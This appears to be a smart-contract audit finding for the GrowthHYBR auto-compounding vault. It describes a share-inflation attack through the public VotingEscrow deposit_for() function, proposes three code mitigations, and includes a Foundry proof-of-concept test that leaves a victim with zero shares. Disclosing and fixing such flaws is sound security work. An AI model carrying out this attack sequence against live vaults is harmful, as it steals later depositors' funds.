  "body": "## Finding description and impact\nThe `GrowthHYBR` contract implements an auto-compounding vault where users deposit HYBR tokens to receive gHYBR shares. The contract internally creates and manages a single veNFT (vote-escrowed NFT) in the `VotingEscrow` contract, where all deposited HYBR is locked.\n\nThrough `GrowthHYBR::deposit()`, users deposit HYBR tokens and receive gHYBR shares proportional to their contribution. The share calculation is based on the ratio between `totalSupply()` (total gHYBR shares) and `totalAssets()` (total HYBR locked in the veNFT):\n\n```solidity\nfunction calculateShares(uint256 amount) public view returns (uint256) {\n    uint256 _totalSupply = totalSupply();\n    uint256 _totalAssets = totalAssets();\n    if (_totalSupply == 0 || _totalAssets == 0) {\n        return amount;  // 1:1 on first deposit\n    }\n    return (amount * _totalSupply) / _totalAssets;\n}\n\nfunction totalAssets() public view returns (uint256) {\n    if (veTokenId == 0) {\n        return 0;\n    }\n    IVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\n    return uint256(int256(locked.amount));\n}\n```\n\nThe vulnerability arises because **anyone can directly call `VotingEscrow::deposit_for()` to increase the locked amount of any veNFT**, including the one owned by `GrowthHYBR`. This allows an attacker to artificially inflate `totalAssets()` without minting corresponding gHYBR shares, enabling a share inflation attack.\n\n## Root Cause\n\nThe root cause lies in two key factors:\n\n1. **Public `deposit_for()` function in VotingEscrow**: The `VotingEscrow::deposit_for()` function is publicly accessible and allows anyone to add HYBR tokens to any existing veNFT:\n\n```solidity\nfunction deposit_for(uint _tokenId, uint _value) external nonreentrant {\n    IVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\n    require(_value > 0, \"ZV\"); \n    require(_locked.amount > 0, 'ZL');\n    require(_locked.end > block.timestamp || _locked.isPermanent, 'EXP');\n    \n    if (_locked.isPermanent) permanentLockBalance += _value;\n    _deposit_for(_tokenId, _value, 0, _locked, DepositType.DEPOSIT_FOR_TYPE);\n    // ...\n}\n```\n\n2. **Direct dependency on veNFT balance**: The `GrowthHYBR::totalAssets()` function directly reads the locked amount from the veNFT, which includes any externally-added tokens:\n\n```solidity\nfunction totalAssets() public view returns (uint256) {\n    if (veTokenId == 0) {\n        return 0;\n    }\n    IVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\n    return uint256(int256(locked.amount)); // Includes attacker's donation\n}\n```\n\nThis creates an exploitable path where `totalAssets` can be inflated without proportionally increasing `totalSupply`, leading to severe share dilution for subsequent depositors.\n\n## Impact\n\n- First depositors can be diluted to 0 shares, with their funds effectively stolen by the attacker\n\n## Recommended mitigation steps\n\nDifferent mitigations are possible, here are some of them :   \n\n### 1. Validate that shares are higher than 0 \n\n```\nfunction deposit(uint256 amount, address recipient) external nonReentrant {\n    require(amount > 0, \"Zero amount\");\n    // ... existing transfer and veNFT logic ...\n    \n    uint256 shares = calculateShares(amount);\n    require(shares > 0, \"Insufficient shares minted\");\n    \n    _mint(recipient, shares);\n    // ... rest of code\n}\n```\n\n### 2. Virtual Shares/Assets :\nAdd virtual offsets to prevent division by zero and share inflation:\n\n```solidity\nfunction calculateShares(uint256 amount) public view returns (uint256) {\n    uint256 _totalSupply = totalSupply();\n    uint256 _totalAssets = totalAssets();\n    if (_totalSupply == 0 || _totalAssets == 0) {\n        return amount;\n    }\n    return (amount * (_totalSupply + 1)) / (_totalAssets + 1);\n}\n```\n\n### 3. Add a slippage to check minimum shares out \n\n```solidity\nfunction deposit(uint256 amount, address recipient, uint256 minSharesOut) external nonReentrant {\n    require(amount > 0, \"Zero amount\");\n    // ... existing transfer and veNFT logic ...\n    \n    uint256 shares = calculateShares(amount);\n    require(shares >= minSharesOut, \"Insufficient shares minted\");\n    \n    _mint(recipient, shares);\n    // ... rest of code\n}\n\n```",
  "proof_of_concept": "Add the following PoC into ``C4PoC.t.sol`` :\n\n```solidity\n   function test_shareInflationAttack0xRaz() external {\n        address attacker = address(0x1);\n        address victim = address(0x2);\n\n        // Setup: Give tokens to attacker and victim\n        uint256 attackAmount = 1000e18;\n        uint256 victimAmount = 1000e18;\n\n        hybr.transfer(attacker, attackAmount);\n        hybr.transfer(victim, victimAmount);\n\n        // Step 1: Attacker deposits 1 wei to get 1 share\n        vm.startPrank(attacker);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(1, attacker);\n        vm.stopPrank();\n\n        uint256 attackerShares = gHybr.balanceOf(attacker);\n        console.log(\"Attacker shares after 1 wei deposit:\", attackerShares);\n\n        // Step 2: Attacker inflates assets by calling deposit_for on veNFT\n        vm.startPrank(attacker);\n        uint256 veTokenId = gHybr.veTokenId();\n        hybr.approve(address(votingEscrow), attackAmount);\n        votingEscrow.deposit_for(veTokenId, attackAmount - 1);\n        vm.stopPrank();\n\n        uint256 totalAssetsBefore = gHybr.totalAssets();\n        console.log(\"Total assets after inflation:\", totalAssetsBefore);\n\n        // Step 3: Victim deposits\n        vm.startPrank(victim);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(victimAmount, victim);\n        vm.stopPrank();\n\n        uint256 victimShares = gHybr.balanceOf(victim);\n        console.log(\"Victim shares after 1000e18 deposit:\", victimShares);\n\n        // Verify the attack\n        uint256 attackerValue = gHybr.calculateAssets(attackerShares);\n        uint256 victimValue = gHybr.calculateAssets(victimShares);\n\n        console.log(\"Attacker's share value:\", attackerValue);\n        console.log(\"Victim's share value:\", victimValue);\n\n        // Attacker's 1 share is worth nearly all assets\n        assertEq(attackerValue, 2000e18);\n        assertEq(victimShares, 0); // Victim gets 0 share\n    }\n\n```",
